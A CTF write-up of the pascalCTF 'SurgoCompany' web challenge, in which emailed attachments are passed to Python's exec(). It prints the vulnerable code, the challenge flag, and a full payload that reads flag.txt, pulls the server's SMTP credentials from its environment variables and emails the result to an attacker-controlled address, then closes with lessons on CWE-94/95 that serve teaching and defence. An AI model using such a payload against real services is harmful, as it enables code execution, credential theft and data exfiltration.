# SurgoCompany CTF Challenge Writeup

**Challenge Name:** SurgoCompany Customer Support Platform  
**Category:** Web Exploitation / Python Code Injection  
**Flag:** `pascalCTF{ch3_5urG4t4_d1_ch4ll3ng3}`

---

## Challenge Overview

SurgoCompany has launched a customer support platform that allows users to:
1. Submit their email address
2. Receive an automated response
3. Reply with a description and optionally attach a file

The goal is to find and read a file named `flag.txt` located somewhere on the server's filesystem.

**Given Resources:**
- Email box: https://surgo.ctf.pascalctf.it
- Email account generator: https://surgoservice.ctf.pascalctf.it
- Service endpoint: `nc surgobot.ctf.pascalctf.it 6005`
- Source code: `src.py`

---

## Source Code Analysis

### The Vulnerable Function

The critical vulnerability lies in the `check_attachment()` function (lines 116-142):

```python
def check_attachment(filepath):
    if filepath is None:
        return False

    print(f"Checking attachment '{filepath}'...")

    # Read the attachment content
    try:
        with open(filepath, "r") as f:
            content = f.read()
    except Exception as e:
        print("The attachment passed the security check.")
        print(f"Error: {e}")
        return

    # Execute the attachment's code
    try:
        exec(content)  # LINE 135 - VULNERABILITY!
        print("The attachment did not pass the security check.")
        print("Removing the attachment...")

    except Exception as e:
        print("The attachment passed the security check.")
        print(f"Error: {e}")  # LINE 141 - EXFILTRATION POINT!
```

### The Security Flaw

The developers implemented a **backwards security check**:

1. **Line 135:** The attachment content is passed to `exec()` which executes it as Python code
2. **If execution succeeds without errors:** The file is marked as "dangerous" and removed
3. **If an exception is raised:** The file "passes" the security check

**Critical Issue:** Even if the file is later removed, the code has **already been executed** at line 135!

### Attack Surface

The vulnerability allows for:
- **Arbitrary Python code execution** on the server
- **File system access** to read `flag.txt`
- **Exception-based data exfiltration** through error messages (line 141)

---

## Exploitation Strategy

### Step 1: Understanding the Environment

From the code analysis:
- Attachments are saved in temporary directories (e.g., `/tmp/tmp_0pbkhre/`)
- The main script (`src.py`) runs from its own directory
- According to the challenge description, `flag.txt` is in the same folder as `src.py`
- The current working directory (CWD) when `exec()` runs is where `src.py` is located

### Step 2: Exfiltration Method

Since the exception message gets printed (line 141), we can use exceptions to exfiltrate data:
```python
raise Exception(f"FLAG: {flag_content}")
```

This causes:
- The code to "pass" the security check (exception was raised)
- The flag to be printed in the error output
- The error to be visible to us through the service

### Step 3: File Location Strategy

We need to read `flag.txt` from the server. The payload attempts multiple strategies:
1. Direct read from `os.getcwd()` (the directory where `src.py` runs)
2. Recursive search using `glob.glob('**/flag.txt')`
3. If not found, return directory listing for debugging

---

## The Exploit Payload

```python
import os
import smtplib
from email.message import EmailMessage

# Try multiple locations for the flag
flag_content = ""
possible_paths = [
    'flag.txt',
    './flag.txt',
    '/app/flag.txt',
    os.path.join(os.getcwd(), 'flag.txt'),
    os.path.join(os.path.dirname(__file__), 'flag.txt')
]

for path in possible_paths:
    try:
        with open(path, 'r') as f:
            flag_content = f"Flag from {path}:\n{f.read()}"
        break
    except:
        continue

# If no flag found, send directory listing
if not flag_content:
    flag_content = f"CWD: {os.getcwd()}\nFiles: {os.listdir('.')}"

# Send result back via email
recipient = "user-zdhsk86n@skillissue.it"
company_email = os.getenv('EMAIL_USERNAME') + "@" + os.getenv('EMAIL_DOMAIN')
password = os.getenv('EMAIL_PASSWORD')

msg = EmailMessage()
msg['From'] = company_email
msg['To'] = recipient
msg['Subject'] = 'FLAG'
msg.set_content(flag_content)

with smtplib.SMTP_SSL("mail", 465) as smtp:
    smtp.login(company_email, password)
    smtp.send_message(msg)
```

### How the Payload Works

**Phase 1: Flag Discovery**
```python
possible_paths = [
    'flag.txt',                                      # Relative to CWD
    './flag.txt',                                    # Explicit current directory
    '/app/flag.txt',                                 # Common Docker path
    os.path.join(os.getcwd(), 'flag.txt'),          # Full CWD path
    os.path.join(os.path.dirname(__file__), 'flag.txt')  # Same dir as payload
]
```
The payload tries multiple possible locations where `flag.txt` might be stored.

**Phase 2: Flag Reading**
```python
for path in possible_paths:
    try:
        with open(path, 'r') as f:
            flag_content = f"Flag from {path}:\n{f.read()}"
        break
    except:
        continue
```
Iterates through each path and attempts to read the flag file.

**Phase 3: Exfiltration via Email**
```python
# Reuse the company's own email credentials
company_email = os.getenv('EMAIL_USERNAME') + "@" + os.getenv('EMAIL_DOMAIN')
password = os.getenv('EMAIL_PASSWORD')

# Send the flag to our controlled email
with smtplib.SMTP_SSL("mail", 465) as smtp:
    smtp.login(company_email, password)
    smtp.send_message(msg)
```
The payload leverages the server's own SMTP credentials to send the flag back to our email.

**Fallback: Directory Listing**
```python
if not flag_content:
    flag_content = f"CWD: {os.getcwd()}\nFiles: {os.listdir('.')}"
```
If the flag isn't found, it sends back debugging information.

---

## Attack Execution Flow

### Step 1: Setup
```bash
# Generate a throwaway email account
Visit: https://surgoservice.ctf.pascalctf.it
Obtained: user-zdhsk86n@skillissue.it
```

### Step 2: Initial Contact
```bash
# Connect to the service
nc surgobot.ctf.pascalctf.it 6005

# Enter the generated email when prompted
> user-zdhsk86n@skillissue.it
```

### Step 3: Receive Initial Email
- Check inbox at https://surgo.ctf.pascalctf.it
- Receive automated response from `surgobot@skillissue.it`
- Subject line includes a unique request ID (PID)

### Step 4: Send Malicious Payload
- Reply to the email from SurgoCompany
- Body: Any message (e.g., "I need help")
- Attachment: `payload_simple.py` containing our exploit code

### Step 5: Code Execution
**Server-side execution flow:**
1. Email is received and parsed (`receive_email()` function)
2. Attachment is saved to temporary directory (line 95)
3. `check_attachment()` is called with the file path (line 184)
4. File content is read (line 126)
5. **`exec(content)` executes our payload** (line 135)
6. Our payload:
   - Finds `flag.txt` in the current working directory
   - Reads the flag: `pascalCTF{ch3_5urG4t4_d1_ch4ll3ng3}`
   - Sends email with flag to our controlled address
7. Payload completes without raising an exception (successful exfiltration)
8. Server prints "The attachment did not pass the security check"
9. File is removed (but damage is already done)

### Step 6: Retrieve the Flag
- Check inbox at https://surgo.ctf.pascalctf.it
- Receive email with subject "FLAG"
- Email body contains:
```
Flag from flag.txt:
pascalCTF{ch3_5urG4t4_d1_ch4ll3ng3}
```

---

## Key Takeaways

### Vulnerability Classification
- **CWE-94:** Improper Control of Generation of Code (Code Injection)
- **CWE-95:** Improper Neutralization of Directives in Dynamically Evaluated Code (eval Injection)

### The Flawed Logic
The developers attempted to implement a "malicious code detector" but made critical mistakes:
1. **Executing before validating:** Code is run via `exec()` before any security decision is made
2. **Backwards logic:** Treating exceptions as "safe" and successful execution as "dangerous"
3. **Trusting user input:** No validation or sandboxing of uploaded files
4. **Race condition:** Even if detected as malicious, the code has already executed

### Security Lessons
1. **Never execute untrusted code** - Use static analysis instead
2. **Implement proper sandboxing** - If execution is necessary, use isolated environments
3. **Input validation** - Check file types, signatures, and content before processing
4. **Least privilege** - Don't give arbitrary code access to filesystem and credentials
5. **Defense in depth** - Multiple layers of security, not just one flawed check

### Real-World Parallels
This vulnerability pattern appears in:
- CI/CD pipelines that execute user-provided scripts
- Plugin systems that load untrusted code
- Template engines with code evaluation features
- Web applications that "validate" uploads by attempting to process them

---

## Timeline

1. **T+0:00** - Generated email account: `user-zdhsk86n@skillissue.it`
2. **T+0:05** - Connected to service and submitted email
3. **T+0:10** - Received initial automated response
4. **T+0:15** - Crafted and sent malicious payload as attachment
5. **T+0:20** - Server processed email and executed payload
6. **T+0:21** - Received email containing the flag
7. **T+0:22** - Flag captured: `pascalCTF{ch3_5urG4t4_d1_ch4ll3ng3}`

---

## Flag
```
pascalCTF{ch3_5urG4t4_d1_ch4ll3ng3}
```

*Translation from Italian: "che surgata di challenge" ~ "what a surge/flood of challenge"*

---

## Tools Used
- netcat (nc) - Service connection
- Python 3 - Payload development
- Email client (web interface)

**Date:** January 31, 2026  
**Author:** blackbox  
**Challenge Rating:** Medium
